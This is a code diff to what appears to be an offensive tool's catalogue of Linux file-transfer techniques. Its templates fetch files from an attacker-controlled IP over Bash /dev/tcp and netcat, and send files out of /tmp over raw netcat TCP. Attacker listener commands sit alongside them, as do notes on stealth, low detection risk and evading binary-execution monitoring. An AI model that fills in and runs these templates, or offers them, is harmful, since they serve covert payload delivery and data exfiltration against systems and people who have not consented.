@@ -53,22 +53,22 @@ LINUX_COMMANDS = {
                 "cat <&3 > /tmp/{filename}"
             ),
             stealth_note=(
-                "Pure Bash built-in — no external binary creates network traffic. "
+                "Bash-specific feature. Will fail on non-bash shells. "
                 "Evades binary-execution detection entirely."
             ),
-            requires="Bash with /dev/tcp support (enabled by default on most Linux).",
+            requires="Requires bash shell (not dash, sh, or zsh)",
             privilege="user",
             detection_risk="low",
         ),
         TechniqueEntry(
             name="nc (netcat pull)",
             binary="nc",
-            template="nc -w3 {ip} {port} < /dev/null | dd of=/tmp/{filename}",
+            template="nc -w3 {ip} {port} > /tmp/{filename}",
             stealth_note=(
                 "Netcat is a standard sysadmin tool. "
                 "Short-lived connection (-w3 timeout) leaves minimal log footprint."
             ),
-            requires="Attacker must pipe file data upon connection (e.g. nc -lvp {port} < {filename}).",
+            requires="Attacker must pipe file data upon connection (e.g. nc -lvnp {port} < {filename}).",
             privilege="user",
             detection_risk="medium",
         ),
@@ -111,10 +111,10 @@ LINUX_COMMANDS = {
         TechniqueEntry(
             name="nc (raw TCP exfil)",
             binary="nc",
-            template="nc -w5 {ip} {port} < /tmp/{filename}",
+            template="cat /tmp/{filename} | nc -w1 {ip} {port}",
             stealth_note=(
                 "Raw TCP transfer — no HTTP headers, minimal log artifacts. "
-                "Short connection window (-w5) limits exposure."
+                "Short connection window (-w1) limits exposure."
             ),
             requires="Attacker listener: nc -lvnp {port} > received_{filename}",
             privilege="user",
